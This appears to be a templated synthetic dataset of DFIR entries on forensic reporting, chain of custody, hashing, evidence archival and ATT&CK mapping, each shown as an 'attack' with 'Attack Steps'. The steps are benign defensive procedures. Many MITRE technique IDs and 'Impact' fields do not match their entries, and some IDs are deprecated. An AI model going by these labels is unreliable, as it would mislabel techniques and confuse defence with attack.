- **Attack Type**: Legal Reporting
- **Target**: Legal/Court
- **Vulnerability**: Poorly structured report can lose legal validity
- **MITRE**: T1119
- **Impact**: Weak courtroom defensibility
- **Tools**: Microsoft Word, CaseMap, KAPE Reports
- **Scenario**: The DFIR team is asked to create a formal report that will be used in court.
- **Attack Steps**: 1. Gather parsed artifact summaries from tools like KAPE. 2. Start the report with an executive summary (incident, systems affected, actions taken). 3. Use timelines and visual aids to present technical findings clearly. 4. Structure content in sections: Objectives, Methodology, Evidence, Findings, Impact, and Conclusion. 5. Add an appendix with hash lists, tool logs, screenshots. 6. Apply numbered headings and consistent formatting for readability. 7. Export to PDF and retain signed copies for archiving.
- **Detection**: Peer review reports for completeness
- **Solution**: Follow structured format for legal clarity
- **Tags**: dfir report, legal presentation

## Preserving Log Integrity Before Archival

- **Attack Type**: Log Tampering
- **Target**: Server
- **Vulnerability**: Lack of post-incident log integrity
- **MITRE**: T1565.001
- **Impact**: Logs lose evidentiary value
- **Tools**: Syslog-ng, Tripwire, Filebeat
- **Scenario**: A system administrator needs to ensure that system logs are unaltered before being archived.
- **Attack Steps**: 1. Set up Filebeat to collect and forward logs to a central secure server. 2. Use Tripwire to monitor log file integrity at rest. 3. Define checksum policies to detect any unauthorized changes. 4. Rotate and compress logs weekly using secure shell scripts. 5. Store compressed archives in a WORM (Write Once Read Many) storage solution. 6. Record the hash and storage path in the inventory register. 7. Test restoration procedures periodically to verify access and validity.
- **Detection**: Compare archived logs to checksum records
- **Solution**: Use file integrity tools and WORM storage
- **Tags**: log archival, file integrity

## Preparing a TTP Heat Map for Stakeholders

- **Attack Type**: Executive Summary
- **Target**: Executives
- **Vulnerability**: Unclear mapping of threats to tactics
- **MITRE**: T1036, T1569
- **Impact**: Incomplete executive visibility
- **Tools**: MITRE ATT&CK Navigator, PowerPoint
- **Scenario**: CISO requests a visual representation of TTPs involved in a multi-stage attack.
- **Attack Steps**: 1. Review forensic findings and attack stages. 2. Identify and list all ATT&CK techniques triggered. 3. Open the ATT&CK Navigator and color-code techniques by phase (e.g., red for execution, yellow for discovery). 4. Export heat map as image. 5. Embed in PowerPoint with captions explaining each colored box. 6. Include footnotes referencing evidence collected. 7. Present to stakeholders for risk awareness and mitigation planning.
- **Detection**: Validate techniques with evidence links
- **Solution**: Visual TTP mapping with summaries
- **Tags**: executive reporting, heat map

## Legal Handoff with Chain-of-Custody Manifest

- **Attack Type**: Evidence Transfer
- **Target**: Legal
- **Vulnerability**: Missing or unsigned manifest
- **MITRE**: T1005
- **Impact**: Legal rejection of evidence
- **Tools**: EnCase, SHA256SUM, Excel
- **Scenario**: The DFIR lead must transfer forensic evidence to the legal team, including a full manifest.
- **Attack Steps**: 1. Compile all evidence collected (images, memory dumps, logs). 2. Calculate SHA-256 hashes for every item. 3. Create an Excel manifest listing filename, hash, acquisition tool, and timestamp. 4. Print and sign the manifest; scan a digital copy for backup. 5. Package files in an encrypted archive. 6. Physically hand over evidence with manifest, capturing signatures from both parties. 7. Log the transfer time and ID in internal tracking system.
- **Detection**: Cross-check manifest and hash logs
- **Solution**: Use signed manifests for all handoffs
- **Tags**: evidence transfer, custody manifest

## Documenting Forensic Analysis Methodology

- **Attack Type**: Case Summary
- **Target**: Internal IR
- **Vulnerability**: Undocumented steps reduce case credibility
- **MITRE**: T1055, T1049
- **Impact**: Lack of transparency
- **Tools**: X-Ways, Volatility, Notepad++
- **Scenario**: A senior analyst needs to record how forensic tools were used for peer review and legal defense.
- **Attack Steps**: 1. During analysis, document tool version, config used, and exact commands run. 2. Record analysis timeline (e.g., “memory dump examined with Volatility v2.6 using pslist”). 3. Note file paths, hashes, and time of extraction. 4. Add screenshots of key findings where applicable. 5. Summarize reasoning behind conclusions drawn (e.g., malware process confirmed via hollowed PID). 6. Store notes in a text file or report appendix. 7. Review notes with another team member for clarity and completeness.
- **Detection**: Peer-review analysis process
- **Solution**: Maintain clear methodology documentation
- **Tags**: documentation, case notes

## Preserving Evidence During Cloud Incident

- **Attack Type**: Cloud Forensics
- **Target**: Cloud Infrastructure
- **Vulnerability**: Lack of evidence after instance termination
- **MITRE**: T1529
- **Impact**: Permanent loss of evidence
- **Tools**: AWS CloudTrail, AWS CLI, S3, KAPE
- **Scenario**: A cloud-based web server is breached and forensic evidence must be preserved for further investigation.
- **Attack Steps**: 1. Immediately isolate the cloud instance to prevent further damage. 2. Use AWS CloudTrail to extract logs of access, actions, and timestamps. 3. Create EBS snapshots of the compromised VM. 4. Download and hash critical files or logs. 5. Upload files to an S3 bucket with restricted access. 6. Maintain access logs of who downloads/uploads. 7. Record all actions in chain-of-custody file, including IAM user details and commands run.
- **Detection**: Monitor instance and snapshot activity
- **Solution**: Preserve EBS snapshots and logs in secure S3
- **Tags**: cloud dfir, aws forensics

## Chain of Custody Using FTK Imager

- **Attack Type**: Evidence Handling
- **Target**: Workstation
- **Vulnerability**: Improper evidence handling
- **MITRE**: T1560.001
- **Impact**: Preserved image admissible in court
- **Tools**: FTK Imager, Excel
- **Scenario**: Analyst documents forensic image acquisition for a compromised laptop using FTK Imager.
- **Attack Steps**: 1. Connect analyst laptop to suspect device via write blocker. 2. Launch FTK Imager and select physical drive to image. 3. Choose E01 format and enable hashing (MD5/SHA1). 4. Begin acquisition and monitor for any read/write errors. 5. Save resulting image and log hashes generated. 6. Open Excel template for chain of custody. 7. Log who acquired the image, date, time, location, and equipment used. 8. Record hash values to verify data integrity. 9. Assign evidence tag ID and store image in secure storage. 10. Chain of custody sheet is signed by each person who handles the evidence thereafter.
- **Detection**: Cross-verify hash with original media
- **Solution**: Follow strict chain-of-custody protocol
- **Tags**: chain of custody, FTK, forensic imaging, courtroom evidence

## Mapping TTPs in Incident Report

- **Attack Type**: TTP Correlation
- **Target**: Enterprise network
- **Vulnerability**: Incomplete attribution
- **MITRE**: T1087, T1003, T1021
- **Impact**: Helps correlate behavior to known threat groups
- **Tools**: MITRE ATT&CK Navigator, Timesketch
- **Scenario**: Security analyst creates a structured incident report including attacker’s mapped TTPs using MITRE ATT&CK.
- **Attack Steps**: 1. Review forensic logs and extracted events from Timesketch. 2. Document the sequence of attacker activities (e.g., credential dumping, lateral movement). 3. Open MITRE ATT&CK Navigator. 4. Highlight each observed TTP used in the case. 5. Note technique IDs (e.g., T1003 for LSASS memory dump). 6. Export the heatmap and attach to the incident report. 7. Describe each mapped TTP and link it to observed artifacts. 8. Add detection sources and impact under each TTP. 9. Include ATT&CK version used and citation date. 10. Share final report with SOC and compliance team.
- **Detection**: MITRE heatmap overlay with evidence
- **Solution**: Integrate ATT&CK into incident reporting
- **Tags**: MITRE, TTP mapping, ATT&CK Navigator

## Legal Collaboration for Evidence Admissibility

- **Attack Type**: Legal Coordination
- **Target**: Laptop
- **Vulnerability**: Mishandled evidence
- **MITRE**: T1555.003
- **Impact**: Evidence eligible for court
- **Tools**: Chain-of-custody forms, Legal counsel, FTK Imager
- **Scenario**: IR team collaborates with legal to ensure forensics data collected post-breach remains admissible in legal proceedings.
- **Attack Steps**: 1. Initiate communication with internal legal counsel. 2. Discuss required standards for evidence admissibility. 3. Ensure write blockers are used on suspect media. 4. Use validated forensic tools (e.g., FTK Imager, X-Ways). 5. Maintain complete documentation during imaging. 6. Collect chain-of-custody forms signed by all handlers. 7. Validate evidence hashes and store securely. 8. Avoid altering original evidence during analysis. 9. Review report structure with legal for compliance. 10. Submit report and evidence as per legal protocol.
- **Detection**: Legal compliance checklists
- **Solution**: Involve legal in early evidence handling
- **Tags**: legal forensics, admissibility, chain of custody

## Creating Court-Admissible Email Logs

- **Attack Type**: Email Forensics
- **Target**: Mail server
- **Vulnerability**: BEC email infiltration
- **MITRE**: T1114
- **Impact**: Evidence extracted for litigation
- **Tools**: ExMerge, PowerShell, FTK Imager
- **Scenario**: DFIR analyst generates evidentiary email logs from an Exchange server post-BEC attack.
- **Attack Steps**: 1. Isolate affected mailbox on Exchange server. 2. Use PowerShell or ExMerge to extract mailbox contents. 3. Save export in PST format and note file hash. 4. Document extraction date, operator name, and purpose. 5. Store PST securely and log chain of custody. 6. Analyze suspicious emails: headers, attachments, reply paths. 7. Correlate with network logs to identify delivery and read status. 8. Summarize findings and add metadata (sender IP, timestamp). 9. Create formal timeline from mail artifacts. 10. Package PST, logs, and report for legal submission.
- **Detection**: Header analysis + hash validation
- **Solution**: Export and preserve email legally
- **Tags**: email logs, BEC, PST, legal

## Automating Evidence Hash Verification

- **Attack Type**: Integrity Verification
- **Target**: Workstation
- **Vulnerability**: Integrity not verified
- **MITRE**: T1005
- **Impact**: Confirms evidence unaltered
- **Tools**: PowerShell, Hashdeep
- **Scenario**: Analyst automates hash comparison for multiple evidence files using PowerShell script.
- **Attack Steps**: 1. Store all disk images and extracted artifacts in designated folder. 2. Create hash list of all files using Get-FileHash. 3. Compare output to known-good hash values from imaging logs. 4. Use PowerShell loop to report mismatches. 5. Redirect output to audit log CSV. 6. Timestamp each entry with UTC time. 7. Record result (match/mismatch) for each file. 8. Review for any tampering flags. 9. Preserve script, output logs, and source hashes. 10. Attach hash comparison result to final forensic report.
- **Detection**: Scripted hash matching
- **Solution**: Automate hash checks with logs
- **Tags**: hash validation, evidence integrity, scripting

## Centralized Evidence Repository Logging

- **Attack Type**: Evidence Management
- **Target**: Enterprise systems
- **Vulnerability**: Poor evidence tracking
- **MITRE**: T1070.004
- **Impact**: Improves integrity and auditability
- **Tools**: SharePoint, ELK, KAPE
- **Scenario**: Security team builds centralized repository for all evidence and logs associated metadata for each file.
- **Attack Steps**: 1. Set up a secure folder structure for cases. 2. For each case, create folders for memory, registry, logs, images. 3. Configure SharePoint or ELK to ingest metadata (hashes, tags, type). 4. Create evidence intake forms to log contributor, timestamps, and notes. 5. Log all hash values and case numbers in separate index. 6. Create access controls based on case roles. 7. Enable audit logs to track file access. 8. Integrate automated alerting on unauthorized access. 9. Document procedures in IR policy. 10. Train team on using the repository during IR.
- **Detection**: Access audit logs, hash checks
- **Solution**: Centralized secured repo
- **Tags**: digital evidence, evidence management, audit logs

## Evidence Packaging and Report Archiving

- **Attack Type**: Post-Incident Closure
- **Target**: DFIR Analyst System
- **Vulnerability**: Archive tampering
- **MITRE**: T1565.001
- **Impact**: Secures evidence post-incident
- **Tools**: 7-Zip, PDF tools, VeraCrypt
- **Scenario**: Analyst prepares final DFIR report with attachments and stores archive with tamper-evident controls.
- **Attack Steps**: 1. Compile all artifacts: images, memory dumps, logs, reports. 2. Convert final DFIR report to tamper-proof PDF. 3. Use 7-Zip to compress all items with AES-256 encryption. 4. Generate SHA-256 hash of archive. 5. Store archive on encrypted USB drive. 6. Write hash on a signed evidence label. 7. Store USB in locked evidence cabinet. 8. Upload a read-only copy to SharePoint with access restrictions. 9. Create incident summary and preservation log. 10. Document archive location and access method in case tracker.
- **Detection**: Hash mismatch alerts
- **Solution**: Encrypt and track archive package
- **Tags**: DFIR archive, encryption, report closure

## Generating IOC Appendix for Reports

- **Attack Type**: Threat Intel Reporting
- **Target**: SOC
- **Vulnerability**: IOC loss or tampering
- **MITRE**: T1059, T1566
- **Impact**: Boosts threat intel sharing
- **Tools**: IOC Editor, MISP, OpenIOC
- **Scenario**: Analyst extracts IOCs during IR and appends them in IOC format for reuse and sharing.
- **Attack Steps**: 1. Review timeline and malware indicators observed. 2. Extract file hashes, registry paths, domains, IPs. 3. Use IOC Editor or MISP to create structured IOCs. 4. Tag indicators with case ID and confidence level. 5. Export IOCs in STIX, OpenIOC, or JSON format. 6. Include indicators as appendix to main DFIR report. 7. Cross-check with threat intel feeds for overlaps. 8. Share with internal threat hunting team. 9. Upload to MISP server with access controls. 10. Log export metadata and location.
- **Detection**: IOC validation and duplication check
- **Solution**: Append IOCs to final report
- **Tags**: IOC, threat intel, DFIR appendix

## Maintaining IR Case Timeline Log

- **Attack Type**: Timeline Logging
- **Target**: Enterprise Systems
- **Vulnerability**: Poor documentation
- **MITRE**: T1218
- **Impact**: Aligns evidence and actions
- **Tools**: Excel, Timesketch, Redline
- **Scenario**: During investigation, a DFIR lead creates a detailed incident timeline to help correlate events across systems.
- **Attack Steps**: 1. Start with IR initiation date and time. 2. Add each significant action: alert received, initial triage, containment. 3. Note all forensic acquisitions with timestamp and operator. 4. Include observed attacker behaviors and timestamps. 5. Extract logs from Timesketch to verify sequence. 6. Correlate Redline data with IR steps. 7. Mark tool used, system name, and result for each event. 8. Format log for chronological readability. 9. Store case timeline with final report. 10. Update if new info emerges during review.
- **Detection**: Timeline review
- **Solution**: Keep timeline throughout IR
- **Tags**: case timeline, IR log, event tracking

## Forensic Report Review by Legal Counsel

- **Attack Type**: Legal Compliance
- **Target**: Internal Legal Team
- **Vulnerability**: Poor legal alignment
- **MITRE**: T1591
- **Impact**: Ensures legal defensibility
- **Tools**: PDF, Legal team, Email
- **Scenario**: DFIR lead submits final report to legal department for review before disclosure to external stakeholders.
- **Attack Steps**: 1. Compile evidence, artifacts, and narrative into final PDF. 2. Redact sensitive internal IPs and employee names if required. 3. Tag report as “Confidential – Internal Use.” 4. Email report securely to legal counsel. 5. Legal reviews report structure and implications. 6. Suggest edits to language for legal clarity. 7. Remove speculative statements. 8. Finalize version with legal’s approval. 9. Store in legal’s secure archive. 10. Use approved version for sharing with third parties.
- **Detection**: Legal review log
- **Solution**: Redact and review with legal
- **Tags**: legal review, IR report, disclosure

## Documenting Chain of Custody for Email Evidence

- **Attack Type**: Post-Incident
- **Target**: Endpoint
- **Vulnerability**: Email compromise
- **MITRE**: T1114.002
- **Impact**: Ensures evidentiary integrity of email-based data
- **Tools**: FTK Imager, Excel, Chain-of-Custody Template
- **Scenario**: Analyst needs to preserve and track access to email files seized from a compromised mailbox.
- **Attack Steps**: 1. Open FTK Imager and acquire a logical image of the mailbox data (e.g., PST files). 2. Compute and document MD5 and SHA-1 hashes of the original PST file. 3. Save the image to a forensic evidence drive. 4. Open the chain-of-custody template. 5. Fill in the details: evidence ID, description, hash values, custodian, and timestamps. 6. Sign and date the initial collection entry. 7. If the evidence is handed over to another examiner, update the custody log. 8. Store the digital file and printed chain log in separate secure locations.
- **Detection**: Manual evidence transfer monitoring
- **Solution**: Strict chain-of-custody documentation and hashing
- **Tags**: email forensics, chain-of-custody, integrity

## Preserving Forensic Evidence Integrity with Write Blockers

- **Attack Type**: Post-Incident
- **Target**: Physical disk
- **Vulnerability**: Potential evidence overwrite
- **MITRE**: T1005
- **Impact**: Prevents accidental evidence modification
- **Tools**: Tableau Write Blocker, FTK Imager
- **Scenario**: An analyst collects evidence from a hard drive while ensuring no write operations are performed.
- **Attack Steps**: 1. Connect the suspect’s hard drive to a hardware write blocker. 2. Connect the write blocker to the analysis workstation. 3. Open FTK Imager and verify drive is in read-only mode. 4. Acquire a forensic image of the drive. 5. Save the image to an external evidence drive. 6. Generate and store MD5/SHA1 hash values. 7. Document every step in the chain-of-custody form. 8. Preserve both the raw image and logs in evidence storage.
- **Detection**: Hash mismatch alerts or tool validation
- **Solution**: Always use hardware or software write blockers
- **Tags**: write blocker, data preservation, FTK Imager

## Legal Review & Preservation of HR Investigation Artifacts

- **Attack Type**: Internal Threat
- **Target**: Corporate user
- **Vulnerability**: Insider threat artifacts
- **MITRE**: T1086
- **Impact**: Evidence maintained in legally sound form
- **Tools**: X-Ways Forensics, Chain-of-Custody Form, Legal Memo Template
- **Scenario**: HR investigates suspicious insider activity, requiring digital evidence handling compliant with legal standards.
- **Attack Steps**: 1. HR notifies DFIR of potential misconduct. 2. Analyst acquires images of workstation and exports registry, logs, and browser history. 3. Create hash values for each exported artifact. 4. Fill out chain-of-custody form detailing each item collected. 5. Draft a legal memo summarizing how evidence was obtained, preserved, and hashed. 6. Share memo and chain-of-custody with legal for review. 7. Secure artifacts in a restricted evidence repository. 8. Ensure access is logged and restricted to authorized personnel only.
- **Detection**: Legal audit and documentation verification
- **Solution**: Chain-of-custody and legal memos
- **Tags**: legal compliance, HR case, internal threat

## Report Mapping ATT&CK Techniques to Observed Behavior

- **Attack Type**: APT Attack
- **Target**: Windows domain
- **Vulnerability**: Credential misuse, lateral movement
- **MITRE**: Multiple (T1003, T1021, etc.)
- **Impact**: Clear mapping improves stakeholder understanding
- **Tools**: Timesketch, MITRE ATT&CK Navigator
- **Scenario**: A report must align observed attacker actions to known MITRE ATT&CK techniques for executive and legal clarity.
- **Attack Steps**: 1. Analyze event logs and timeline from Timesketch. 2. Identify attacker behaviors like credential dumping or lateral movement. 3. Open MITRE ATT&CK Navigator. 4. Highlight the corresponding techniques (e.g., T1003, T1021). 5. Add custom notes or color coding for observed instances. 6. Export the visual map. 7. Insert the mapping graphic into the incident report. 8. Include justification in the appendix referencing specific log entries.
- **Detection**: Manual technique cross-reference
- **Solution**: Use ATT&CK Navigator in reports
- **Tags**: mitre att&ck, reporting, technique mapping

## Archiving Final DFIR Reports with Hash Validation

- **Attack Type**: Post-Incident
- **Target**: Report repository
- **Vulnerability**: Archive tampering
- **MITRE**: T1005
- **Impact**: Guarantees integrity of final reports
- **Tools**: 7-Zip, sha256sum, Archive Drive
- **Scenario**: Reports and attachments need to be preserved long-term in tamper-evident format.
- **Attack Steps**: 1. Finalize the investigation report as a PDF. 2. Include all attachments: logs, screenshots, hash reports. 3. Use 7-Zip to compress them into a single archive. 4. Generate SHA-256 hash of the archive using sha256sum. 5. Save the hash output to a text file. 6. Store both archive and hash in a secure archive drive. 7. Upload a copy to internal documentation portal with read-only permissions. 8. Periodically re-validate archive integrity using the hash.
- **Detection**: Hash mismatch detection
- **Solution**: Secure archive + hash validation
- **Tags**: archive, hash, report preservation

## Timeline-Based Case Summary for Legal & Executives

- **Attack Type**: Ransomware
- **Target**: Executive team
- **Vulnerability**: Complex report language
- **MITRE**: T1490
- **Impact**: Simplifies incident for decision-makers
- **Tools**: Plaso, Excel, Visio
- **Scenario**: Executives need a clear, readable case timeline derived from technical evidence.
- **Attack Steps**: 1. Use Plaso to generate a super timeline from disk and memory evidence. 2. Identify key attacker actions and timestamps. 3. Export the timeline into Excel. 4. Extract major events and build a simplified timeline. 5. Use Visio or PowerPoint to design a graphical timeline with attacker behavior and responses. 6. Highlight containment and recovery milestones. 7. Review with legal to ensure neutrality and clarity. 8. Insert timeline in the executive summary section of the report.
- **Detection**: Cross-check with event logs
- **Solution**: Executive-ready visual summaries
- **Tags**: visual timeline, executive report

## Redacting Sensitive Data in Public Report Versions

- **Attack Type**: External Disclosure
- **Target**: Public audience
- **Vulnerability**: Exposure of internal info
- **MITRE**: N/A
- **Impact**: Protects internal infrastructure in public docs
- **Tools**: RedactTools, Microsoft Word, Regex
- **Scenario**: The organization must publish a sanitized report without exposing internal usernames, IPs, or configs.
- **Attack Steps**: 1. Open the full report and identify sensitive items like usernames, internal IPs, folder paths. 2. Use RedactTools or Word's search feature with regex to locate sensitive strings. 3. Replace or mask with placeholders (e.g., [REDACTED], XXX.XXX.XXX.XXX). 4. Run a final grep or regex pass to verify nothing is missed. 5. Save the redacted version as a separate file. 6. Apply a watermark (e.g., “Redacted Version”). 7. Send to legal/comms team for final approval. 8. Publish to blog or external report portal.
- **Detection**: Manual validation + regex scan
- **Solution**: Redaction before public disclosure
- **Tags**: redaction, disclosure, public report

## Multi-Team Collaboration Log for Incident Report

- **Attack Type**: Large-Scale Breach
- **Target**: Multi-team
- **Vulnerability**: Lack of process transparency
- **MITRE**: N/A
- **Impact**: Demonstrates audit trail of teamwork
- **Tools**: OneNote, Jira, Shared Drive
- **Scenario**: Legal, IT, Comms, and DFIR teams work together — documentation must show collaboration history.
- **Attack Steps**: 1. Create a shared incident notes document (e.g., OneNote or Google Doc). 2. Each team (DFIR, Legal, Comms) logs their inputs, findings, and decisions. 3. Use Jira or ticketing to track actions and report edits. 4. Maintain version history of reports and notes. 5. Periodically sync team input into the master report. 6. Log meetings, time of evidence review, and decisions taken. 7. Include a final appendix in the report with cross-team activity log. 8. Store logs in the incident archive.
- **Detection**: Version control, access logs
- **Solution**: Shared logs and collaboration logs
- **Tags**: team audit, transparency, reporting

## Recording Analyst Notes for Evidence Interpretation

- **Attack Type**: Live Forensics
- **Target**: Memory image
- **Vulnerability**: No record of live triage
- **MITRE**: T1003, T1055
- **Impact**: Adds context to volatile analysis
- **Tools**: Notepad++, Case Management System
- **Scenario**: Analysts make live observations during memory triage — these need formal documentation.
- **Attack Steps**: 1. During memory triage (e.g., with Volatility), record what you see — anomalies, PIDs, suspicious DLLs. 2. Note down tool, plugin used, and timestamp of finding. 3. Keep observations in a time-sequenced log (e.g., Notepad++). 4. Link each note to memory dump hash or filename. 5. At end of triage, summarize observations in a findings section. 6. Attach logs to case management system or include in report appendix. 7. Sign off on logs with analyst name and date. 8. Preserve the notes securely along with collected evidence.
- **Detection**: Note correlation with tool output
- **Solution**: Maintain structured observation logs
- **Tags**: analyst notes, memory forensics

## Court-Ready Incident Reporting with Evidence Index

- **Attack Type**: Insider Sabotage
- **Target**: Legal/Court
- **Vulnerability**: Missing evidence validation
- **MITRE**: T1565
- **Impact**: Ensures admissible, defensible report
- **Tools**: Case Report Template, Hash Calculator, Binder
- **Scenario**: Legal team requires a full evidence index for possible court submission.
- **Attack Steps**: 1. Gather all case artifacts: images, logs, screenshots, chain-of-custody. 2. Compute and record hash values of each artifact. 3. Create an evidence index: name, description, file hash, location. 4. Use a formal template to compile the full report. 5. Include event timeline, attacker behavior, remediation, and conclusions. 6. Append signed chain-of-custody and hash report. 7. Review with legal and make required edits. 8. Print and bind a hard copy with signatures for court readiness.
- **Detection**: Legal team review + hashing
- **Solution**: Indexing + hash validation + legal sign-off
- **Tags**: court report, chain of custody

## Documenting Timestamps in Volatile Evidence

- **Attack Type**: Evidence Handling
- **Target**: Endpoint
- **Vulnerability**: Volatile evidence loss
- **MITRE**: T1003
- **Impact**: Integrity issues in timeline correlation
- **Tools**: Volatility, Notepad++, Excel
- **Scenario**: Incident responder needs to preserve timestamps of volatile memory artifacts for report inclusion.
- **Attack Steps**: 1. Load the memory dump into Volatility and run a plugin like pslist or pstree to extract process creation timestamps.2. Carefully record each relevant timestamp (process start, network connection time) in a structured format using Excel or Notepad++.3. Cross-reference timestamps with local system time and timezone settings.4. Clearly note the time of acquisition and local timezone settings in the report.5. Include UTC offset to ensure standardization for legal teams and external investigators.6. Save the report in a read-only format like PDF to prevent post-analysis modifications.7. Include tool versions and hash of the memory dump to maintain evidence integrity.
- **Detection**: Timestamp correlation with disk logs
- **Solution**: Use UTC + timestamp standardization
- **Tags**: reporting, volatile memory, timestamps

## Chain of Custody for Cloud-Based Evidence

- **Attack Type**: Evidence Handling
- **Target**: Cloud Environment
- **Vulnerability**: Poor evidence handling in cloud
- **MITRE**: T1565
- **Impact**: Inadmissibility in court
- **Tools**: AWS CloudTrail, Chain of Custody template
- **Scenario**: Investigator acquires logs from AWS and must maintain chain of custody.
- **Attack Steps**: 1. Identify the specific logs (CloudTrail, VPC flow logs) relevant to the incident.2. Export the logs in a secure format and store them in an encrypted archive.3. Immediately hash the archive using SHA-256 and record the hash in the chain-of-custody document.4. Note the date, time, and identity of the person who performed the acquisition.5. Transfer the archive to the analysis environment, logging all movement steps.6. Ensure that access to the logs is strictly controlled and documented.7. Attach the signed chain of custody document as an appendix to the forensic report.
- **Detection**: Chain of custody document review
- **Solution**: Digital evidence protocol for cloud
- **Tags**: cloud, chain of custody, aws, logs

## Writing an Executive Summary of Incident

- **Attack Type**: Reporting
- **Target**: Enterprise
- **Vulnerability**: N/A
- **MITRE**: T1059
- **Impact**: Poor executive awareness
- **Tools**: Timesketch, Google Docs
- **Scenario**: Analyst must translate detailed technical findings into a summary for executives.
- **Attack Steps**: 1. Summarize the attack timeline derived from tools like Timesketch and Plaso.2. Extract only key facts: initial access method, affected systems, impact, and remediation.3. Use bullet points and executive-friendly language to remove technical jargon.4. Add data visualizations like a simple timeline chart.5. Include MITRE techniques involved (e.g., T1059 - Command Execution).6. End with a business impact section: downtime, data loss, or compliance risk.7. Review with senior analyst and finalize in a secure PDF.
- **Detection**: Feedback from executive stakeholders
- **Solution**: Include attack timeline and impact
- **Tags**: executive summary, timeline, mitre

## Evidence Preservation in USB Malware Cases

- **Attack Type**: Physical Evidence
- **Target**: Physical Device
- **Vulnerability**: Data loss or contamination
- **MITRE**: T1200
- **Impact**: Loss of admissibility
- **Tools**: FTK Imager, HashCalc
- **Scenario**: A USB device was used in a malware delivery. Evidence must be documented and preserved.
- **Attack Steps**: 1. Connect the USB device to a write-blocker to avoid accidental modification.2. Image the USB drive using FTK Imager and verify with SHA-256 hash.3. Save both the image and hash file securely in the evidence locker.4. Create a physical chain-of-custody document signed by every handler.5. Photograph the USB device and include images in the report.6. Analyze the image separately using forensic tools.7. Preserve the USB in an anti-static bag with a unique evidence label.
- **Detection**: Physical hash + imaging audit
- **Solution**: Imaging + documentation process
- **Tags**: usb, physical evidence, imaging

## Correlating MITRE Techniques to System Logs

- **Attack Type**: TTP Mapping
- **Target**: Enterprise
- **Vulnerability**: N/A
- **MITRE**: T1086, T1059, T1003
- **Impact**: Clear threat posture visibility
- **Tools**: MITRE ATT&CK Navigator, Event Viewer
- **Scenario**: Analyst wants to map detected attacker behavior to MITRE ATT&CK techniques in the report.
- **Attack Steps**: 1. Analyze the relevant logs such as Windows Event Logs, firewall, and DNS.2. Identify behaviors such as PowerShell execution or credential dumping.3. For each behavior, determine the matching MITRE technique (e.g., T1059 for PowerShell).4. Open the MITRE ATT&CK Navigator and visually map all observed techniques.5. Use the generated heat map in your report to show coverage.6. Include technique IDs, names, and corresponding log evidence.7. This mapping aids legal and compliance reviewers in understanding attacker objectives.
- **Detection**: MITRE mapping in report
- **Solution**: Use Navigator export for reporting
- **Tags**: mitre, ttp mapping, report

## Creating Timeline Evidence for Prosecution

- **Attack Type**: Legal Coordination
- **Target**: Enterprise
- **Vulnerability**: Poor evidence flow
- **MITRE**: T1569
- **Impact**: Misinterpretation of attack flow
- **Tools**: Plaso, Timesketch
- **Scenario**: Incident needs to be presented to legal team with exact sequence of events.
- **Attack Steps**: 1. Use Plaso to generate a super timeline from disk, registry, prefetch, and log sources.2. Load the timeline into Timesketch and filter on attacker activity (cmd.exe, powershell, etc.).3. Export filtered events into a CSV or structured PDF.4. Add manual annotations for key actions like initial access or privilege escalation.5. Align timeline with system clock and translate to UTC.6. Prepare a simplified visual timeline for presentation to legal team.7. Include footnotes referencing original sources and hash verification.
- **Detection**: Cross-check with original log sources
- **Solution**: Annotated timelines
- **Tags**: legal, timeline, plaso, timesketch

## Writing a Forensic Report for Insider Threat

- **Attack Type**: Reporting
- **Target**: Enterprise
- **Vulnerability**: Insider data theft
- **MITRE**: T1081
- **Impact**: Insider threats mishandled
- **Tools**: X-Ways, Notepad++, Word
- **Scenario**: Insider copied sensitive documents — forensic report must be drafted.
- **Attack Steps**: 1. Identify accessed files via file access timestamps using forensic tools like X-Ways.2. Document all access paths, filenames, and times in a structured manner.3. Provide hashes of the affected files to ensure chain-of-evidence.4. Include screenshots from the forensic tools showing file activity.5. Use a clear report structure: Executive Summary → Technical Analysis → Findings.6. Avoid speculation — stick to verifiable facts.7. Share in secure PDF with digital signature.
- **Detection**: Comparison with file audit logs
- **Solution**: Standard forensic report format
- **Tags**: insider threat, x-ways, report

## Documenting Evidence Access Logs

- **Attack Type**: Evidence Tracking
- **Target**: Server
- **Vulnerability**: Unauthorized evidence access
- **MITRE**: T1557
- **Impact**: Contaminated forensic evidence
- **Tools**: Windows Security Logs, Splunk
- **Scenario**: A central server houses forensic images and needs access logging.
- **Attack Steps**: 1. Enable object access auditing on the evidence folder.2. Use Windows Event Viewer or Splunk to track successful/failed access events (Event ID 4663).3. Configure alerts for unauthorized or off-hours access.4. Maintain daily logs in a separate secured location.5. Include access reports as an appendix in your evidence handling documentation.6. Monitor for modifications to the chain-of-custody logs themselves.7. Rotate logs periodically and back up securely.
- **Detection**: Review object access audit logs
- **Solution**: Enforce role-based access + logs
- **Tags**: audit logs, evidence, access

## Reporting Use of Encryption by Attacker

- **Attack Type**: Reporting
- **Target**: Endpoint
- **Vulnerability**: Data encryption by threat actor
- **MITRE**: T1486
- **Impact**: Encrypted loss of evidence
- **Tools**: Volatility, FileAlyzer, 7-Zip
- **Scenario**: Attacker encrypted stolen data before exfil — must be documented for court.
- **Attack Steps**: 1. Identify encrypted files using file signatures or entropy checks.2. Note encryption algorithms if known (e.g., AES-256 in 7-Zip).3. Capture metadata like creation and modification timestamps.4. Include a sample encrypted file and its hash in the report.5. Note if any keys or password artifacts were found in memory.6. If encryption was combined with exfiltration, mention that flow.7. Clearly indicate the encryption’s role in obfuscating evidence.
- **Detection**: Entropy + file header checks
- **Solution**: Include encrypted file metadata
- **Tags**: encryption, reporting, evidence

## Drafting Compliance-Friendly Reports

- **Attack Type**: Legal Coordination
- **Target**: Enterprise
- **Vulnerability**: Regulatory breach risk
- **MITRE**: T1485
- **Impact**: Non-compliance fines
- **Tools**: Word, Adobe Acrobat, Compliance checklist
- **Scenario**: SOC must prepare a report aligning with GDPR or HIPAA compliance.
- **Attack Steps**: 1. Identify affected data: PII, PHI, or financial data.2. Map the incident to legal obligations (e.g., 72-hour reporting under GDPR).3. Remove unrelated or speculative content from the report.4. Use the compliance checklist to validate inclusion of necessary fields (e.g., breach type, scope, mitigations).5. Add organization contact for regulators and affected parties.6. Digitally sign the report and lock it as PDF.7. Maintain an internal version with detailed forensic timelines.
- **Detection**: Legal review pre-submission
- **Solution**: Legal + technical split in reporting
- **Tags**: gdpr, hipaa, compliance

